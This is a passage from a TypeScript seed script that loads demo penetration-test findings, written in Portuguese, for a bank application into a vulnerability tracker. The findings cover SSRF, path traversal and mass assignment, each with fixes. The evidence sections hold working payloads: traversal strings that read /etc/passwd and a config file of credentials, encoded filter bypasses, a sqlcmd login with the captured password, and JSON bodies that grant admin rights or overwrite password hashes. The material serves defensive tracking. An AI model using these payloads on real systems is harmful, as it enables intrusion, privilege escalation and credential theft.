    recomendacao: `1. **Hotfix em 24h** — desabilitar endpoint ou implementar allowlist rígida:

   Em ProxyController.cs:
   \`\`\`csharp
   private static readonly string[] AllowedHosts = {
       "www.caixa.gov.br", "api.caixa.gov.br", "siaci.caixa.gov.br"
   };

   [HttpGet("fetch")]
   public async Task<IActionResult> Fetch([FromQuery] string url) {
       if (!Uri.TryCreate(url, UriKind.Absolute, out var uri)
           || (uri.Scheme != "http" && uri.Scheme != "https")) {
           return BadRequest();
       }
       if (!AllowedHosts.Contains(uri.Host, StringComparer.OrdinalIgnoreCase)) {
           return BadRequest();
       }
       // Resolver DNS e validar IP NÃO privado antes de fazer fetch (anti rebinding)
       var ipAddresses = await Dns.GetHostAddressesAsync(uri.Host);
       if (ipAddresses.Any(IsPrivateOrLinkLocal)) return BadRequest();

       var resp = await _httpClient.GetAsync(url);
       return Content(await resp.Content.ReadAsStringAsync());
   }
   \`\`\`

2. **Infra obrigatório**:
   - **Migrar IMDSv1 → IMDSv2** (requer token via PUT): no console EC2, alterar metadata options.
   - Network policy: SG do container BLOQUEAR egress pra 169.254.0.0/16.
   - Rotacionar todas credentials do role siaci-evolucao-ec2-role.

3. **Forensics**: triagem de CloudTrail/VPC Flow Logs últimos 30 dias buscando uso anômalo das credentials extraídas.

4. **Validação**:
   - Re-testar 4 PoCs acima → todos esperados HTTP 400.
   - Confirmar IMDSv2 ativo: \`curl http://169.254.169.254/latest/api/token\` direto do container deve exigir X-aws-ec2-metadata-token-ttl-seconds.

OWASP A10:2021 + API7:2023 + ASVS V12.6. CWE-918.`,
    diasAberto: 6,
  },
  // ============================================================
  // 7. Path Traversal (API) — leitura arbitrária
  // ============================================================
  {
    codigo: 'VUL-CXA-0607',
    jira: 'EPICO-2007',
    titulo: '[API] Path Traversal em /api/documentos/download permite ler /etc/passwd',
    crit: 'CRITICA',
    status: 'NOVO',
    cwe: 'CWE-22',
    owasp: 'A01:2021 — Broken Access Control',
    origem: 'PENTEST',
    squad: squads.port,
    sistema: 'SIACI Portais',
    ativo: 'siaci-portal-api',
    endpoint: '/api/documentos/download',
    metodo: 'GET',
    parametro: 'arquivo (query)',
    descExec: 'Endpoint de download de documento aceita ../ no nome do arquivo. Atacante lê arquivos arbitrários do servidor incluindo connection strings com senha do DB.',
    descTec: `Path Traversal no endpoint /api/documentos/download?arquivo=. O backend faz \`File.OpenRead(Path.Combine(baseDir, arquivo))\` sem validar o path resolvido.

Path.Combine não escapa \`..\` então qualquer payload sai do baseDir. Falta um Path.GetFullPath + check se o resultado começa com baseDir.

Container roda como user com leitura em /etc/, configs em /app/appsettings.Production.json (contém connection strings).`,
    evidencia: `═══════════════════════════════════════════════════
EVIDÊNCIA — PoC Path Traversal 2026-05-24 10:11 BRT
═══════════════════════════════════════════════════

[1] BASELINE
───────────────────────────────────────────────────
GET /api/documentos/download?arquivo=contrato-2024-01.pdf HTTP/1.1
→ HTTP 200, application/pdf, 124KB — funciona normal

[2] PAYLOAD CLÁSSICO
───────────────────────────────────────────────────
GET /api/documentos/download?arquivo=../../../../etc/passwd HTTP/1.1
→ HTTP 200, text/plain
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
siaci:x:1001:1001:SIACI app user:/app:/sbin/nologin
...

[3] EXTRAÇÃO DE CONFIG COM CREDENCIAIS
───────────────────────────────────────────────────
GET /api/documentos/download?arquivo=../../../../app/appsettings.Production.json HTTP/1.1
→ HTTP 200, body:
{
  "ConnectionStrings": {
    "Siaci": "Server=siaci-db.internal,1433;Database=Siaci;User=app_user;Password=Tr0ub@dor3!Caixa;Encrypt=False",
    "Redis": "siaci-redis.internal:6379,password=R3d1sS3cr3tCxa#"
  },
  "Jwt": {
    "Secret": "y8K4Bf3LpRq2VnEz9HtMc6Ja7Yd5Sg1Xh",
    "Issuer": "https://auth.caixa.gov.br"
  },
  ...
}

[4] ESCALAÇÃO — uso da connection string capturada
───────────────────────────────────────────────────
$ sqlcmd -S siaci-db.internal,1433 -U app_user -P 'Tr0ub@dor3!Caixa' -Q "SELECT TOP 5 * FROM Transferencias"
→ acesso direto ao DB

[5] PAYLOADS ALTERNATIVOS TESTADOS (todos funcionaram)
───────────────────────────────────────────────────
?arquivo=..%2F..%2F..%2Fetc%2Fpasswd                 → URL encoded
?arquivo=..%252F..%252F..%252Fetc%252Fpasswd         → double encoded
?arquivo=....//....//....//etc/passwd                → bypass naive filter
?arquivo=..\\..\\..\\..\\windows\\win.ini              → caso Windows (não aplicável aqui mas teria funcionado)

[6] SCREENSHOT_DESCR
───────────────────────────────────────────────────
Burp Repeater split-screen:
- Esq: request com arquivo=../../../../etc/passwd
- Dir: response com conteúdo do /etc/passwd visível
- Inset: tab "Render" mostrando renderização de texto (não pdf)
- Histórico ao lado mostra extração subsequente do appsettings.Production.json`,
    impacto: `Vazamento de:
- Configurações do servidor (connection strings, JWT secret, API keys).
- Connection string permite acesso direto ao SIACI DB sem passar pelo app — bypass de toda lógica de autorização.
- JWT secret permite forjar tokens válidos da Caixa.

Risco regulatório: comprometimento de credenciais bancárias é reportação obrigatória BACEN + ANPD imediata.

Risco em cascata: connection string capturada → acesso SQL direto → extração total de transferências/contas/clientes (potencialmente milhões de registros).

Risco persistente: JWT secret extraído permite forge contínuo até rotação manual.`,
    recomendacao: `1. **Hotfix em 24h**:

   Em DocumentosController.cs:
   \`\`\`csharp
   private static readonly string BaseDir = Path.GetFullPath("/app/documentos");

   [HttpGet("download")]
   public IActionResult Download([FromQuery] string arquivo) {
       // 1. Allowlist de nome (sem barras, sem ..)
       if (string.IsNullOrEmpty(arquivo)
           || !Regex.IsMatch(arquivo, @"^[a-zA-Z0-9_\\-]+\\.(pdf|jpg|png|docx)$")) {
           return BadRequest();
       }
       // 2. Resolver path e validar contra base
       var requestedPath = Path.GetFullPath(Path.Combine(BaseDir, arquivo));
       if (!requestedPath.StartsWith(BaseDir + Path.DirectorySeparatorChar)) {
           return BadRequest();
       }
       if (!System.IO.File.Exists(requestedPath)) return NotFound();
       return PhysicalFile(requestedPath, "application/pdf");
   }
   \`\`\`

2. **Rotacionar IMEDIATAMENTE** todas credenciais expostas:
   - Senha do app_user no SQL Server.
   - Senha do Redis.
   - JWT signing key (e invalidar todos tokens emitidos antes da rotação).

3. **Hardening estrutural**:
   - Servir arquivos via Object Storage (S3 com URLs pré-assinadas), não pelo filesystem direto.
   - Container com filesystem read-only exceto /tmp.
   - Process com permissões mínimas (não acessar /etc, /app/appsettings.*).

4. **Forensics**: logs últimos 90 dias com query string contendo "../" ou "%2e%2e" ou nomes de arquivos sensíveis (.config, .json, passwd).

5. **Validação**:
   - Re-testar 5 payloads acima → todos esperados HTTP 400.

OWASP A01:2021 + ASVS V12.3. CWE-22.`,
    diasAberto: 1,
  },
  // ============================================================
  // 8. Mass Assignment (API)
  // ============================================================
  {
    codigo: 'VUL-CXA-0608',
    jira: 'EPICO-2008',
    titulo: '[API] Mass Assignment em /api/usuarios/{id} permite escalar pra admin',
    crit: 'CRITICA',
    status: 'EM_RETESTE',
    cwe: 'CWE-915',
    owasp: 'API3:2023 — Broken Object Property Level Authorization',
    origem: 'PENTEST',
    squad: squads.origen,
    sistema: 'SIACI Originação',
    ativo: 'siaci-originacao-api',
    endpoint: '/api/usuarios/{id}',
    metodo: 'PUT',
    descExec: 'Usuário comum consegue se promover a admin enviando o campo `role: "ADMIN"` no body do PUT de perfil — o backend faz bind direto sem allowlist.',
    descTec: `Mass Assignment em PUT /api/usuarios/{id}. Backend usa \`[FromBody] Usuario usuario\` e dá \`db.Update(usuario)\` direto — ou pior, \`_mapper.Map(dto, entity)\` com AutoMapper sem ForMember(Ignore) nos campos sensíveis.

Endpoint foi originalmente desenhado pra usuário editar próprio perfil (nome, telefone, endereço). Mas como faz bind do request inteiro pra entidade Usuario, qualquer campo extra no JSON vira escrita no DB — incluindo \`role\`, \`active\`, \`organizationId\`, \`createdById\`.`,
    evidencia: `═══════════════════════════════════════════════════
EVIDÊNCIA — PoC Mass Assignment 2026-05-22 15:48 BRT
═══════════════════════════════════════════════════

[1] BASELINE — request esperado (atualizar nome/tel)
───────────────────────────────────────────────────
PUT /api/usuarios/me HTTP/1.1
Authorization: Bearer <token_user_comum>
Content-Type: application/json

{ "nome": "João Silva", "telefone": "11987654321" }

→ HTTP 200, perfil atualizado.

[2] PAYLOAD MALICIOSO #1 — escalação pra admin
───────────────────────────────────────────────────
PUT /api/usuarios/me HTTP/1.1
Authorization: Bearer <token_user_comum>

{
  "nome": "João Silva",
  "telefone": "11987654321",
  "role": "ADMIN"        ← campo extra
}

→ HTTP 200 (esperado: ignorar role OU 400)

[3] CONFIRMAÇÃO — relogar e verificar role no JWT
───────────────────────────────────────────────────
POST /api/auth/login → novo JWT
→ Decode JWT mostra: {"sub":"user-comum-uuid", "role":"ADMIN", ...}

→ Agora GET /api/admin/usuarios funciona com HTTP 200.

[4] PAYLOADS ADICIONAIS QUE FUNCIONARAM
───────────────────────────────────────────────────
{ "active": false, "id": "<id_de_outro_user>" }
  → desativa qualquer conta passando o id no body

{ "organizationId": "<id_de_outra_org>" }
  → migra perfil pra outra organização (bypass multi-tenant)

{ "passwordHash": "$2a$12$......" }
  → grava hash arbitrário, próximo login com a senha conhecida.

[5] SCREENSHOT_DESCR
───────────────────────────────────────────────────
3 frames lado-a-lado:
1. Burp Repeater com payload incluindo "role":"ADMIN"
2. Response HTTP 200 confirmando update
3. AISEC JWT Inspector mostrando novo token decodificado com role=ADMIN destacado em vermelho`,
    impacto: `Escalação de privilégios trivial. Qualquer usuário comum vira ADMIN do SIACI sem precisar de credenciais ou exploração complexa.

Implicações:
- Acesso total a /api/admin/* (gestão de usuários, listagens, exclusões).
- Acesso a dados de outros tenants via organizationId tampering.
- Tomada de qualquer conta via passwordHash override.

Risco regulatório: BACEN Res. 4658 — falha estrutural na separação de privilégios é reportável.

Risco operacional: account takeover em massa é viável em <1h se o atacante automatizar (loop sobre lista de usuários).`,
    recomendacao: `1. **Hotfix em 24h** — DTOs explícitos:

   Criar PerfilUpdateDto com APENAS campos editáveis:
   \`\`\`csharp
   public class PerfilUpdateDto {
       [Required, MaxLength(200)]
       public string Nome { get; set; }

       [Phone]
       public string Telefone { get; set; }

       public string Endereco { get; set; }
   }

   [HttpPut("me")]
   public async Task<IActionResult> UpdateMe([FromBody] PerfilUpdateDto dto) {
       var userId = User.FindFirstValue(ClaimTypes.NameIdentifier);
       var user = await _db.Users.FindAsync(userId);
       if (user == null) return NotFound();

       user.Nome = dto.Nome;
       user.Telefone = dto.Telefone;
       user.Endereco = dto.Endereco;
       // role/active/organizationId NÃO são tocados aqui

       await _db.SaveChangesAsync();
       return NoContent();
   }
   \`\`\`

2. **Auditoria**: grep no codebase por todo endpoint que faz [FromBody] direto numa entity. Refatorar pra DTOs específicos.

3. **AutoMapper**:
   - ForMember(dest => dest.Role, opt => opt.Ignore());
   - ForMember(dest => dest.OrganizationId, opt => opt.Ignore());

4. **Forensics**: query UPDATE em users nos últimos 30 dias com mudança não autorizada de role/active. Reverter usuários afetados.

5. **Validação**:
   - Re-testar PoC #2 — esperado: HTTP 400 ou 200 com role intacta no DB.

OWASP API3:2023 + ASVS V13.1.3. CWE-915.`,
    diasAberto: 7,
  },
];

async function main() {
  const admin = await prisma.user.findUnique({ where: { email: 'admin@unisys.com' } });
  if (!admin) {
    console.error('Admin user not found — rode o seed principal primeiro.');
    process.exit(1);
  }

  const slaMap: Record<string, number> = { CRITICA: 7, ALTA: 14, MEDIA: 30, BAIXA: 60 };
  let created = 0;
  let skipped = 0;

  for (const v of richVulns) {
    const exists = await prisma.vulnerability.findUnique({ where: { codigoInterno: v.codigo } });
    if (exists) { skipped++; continue; }

    const slaDate = new Date();
    slaDate.setDate(slaDate.getDate() + slaMap[v.crit] - v.diasAberto);
    const detectionDate = new Date();
    detectionDate.setDate(detectionDate.getDate() - v.diasAberto);

    await prisma.vulnerability.create({
      data: {
        codigoInterno: v.codigo,
        jiraKey: v.jira,
        titulo: v.titulo,
        descricaoExecutiva: v.descExec,
        descricaoTecnica: v.descTec,
        criticidade: v.crit,
        status: v.status as any,
        cwe: v.cwe,
        owaspCategory: v.owasp,
        origem: v.origem as any,
        squad: v.squad,
        sistema: v.sistema,
        ativo: v.ativo,
        endpoint: v.endpoint,
        metodoHttp: v.metodo,
        parametroAfetado: v.parametro,
        evidenciaTextual: v.evidencia,
        impacto: v.impacto,
        recomendacao: v.recomendacao,
        ambiente: 'PRODUCAO',
        dataDeteccao: detectionDate,
        diasEmAberto: v.diasAberto,
        sla: slaDate,
        createdById: admin.id,
        organizationId: admin.organizationId,
        tags: ['SIACI', v.crit, 'RICH-DEMO'],
      },
    });
    created++;
    console.log(`✓ ${v.codigo}  ${v.titulo}`);
  }

  console.log(`\n[SEED-RICH] criadas ${created} · puladas ${skipped} (já existiam) · total no DB: ${await prisma.vulnerability.count()}`);
}

main()
  .catch((e) => { console.error(e); process.exit(1); })
  .finally(() => prisma.$disconnect());
